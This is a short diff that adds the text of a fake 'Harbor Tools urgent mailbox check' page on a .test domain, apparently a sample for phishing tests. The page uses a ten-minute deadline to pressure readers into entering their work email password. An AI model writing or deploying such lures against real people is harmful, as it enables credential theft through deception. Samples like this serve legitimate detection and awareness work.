@@ -1,0 +1,8 @@
+harbor-tools-security.test
+Harbor Tools urgent mailbox check
+
+Your Harbor Tools mailbox closes in ten minutes. This security page is hosted outside harbor-tools.test. Enter your work email password below to keep all your messages.
+
+Account email
+Password
+Continue
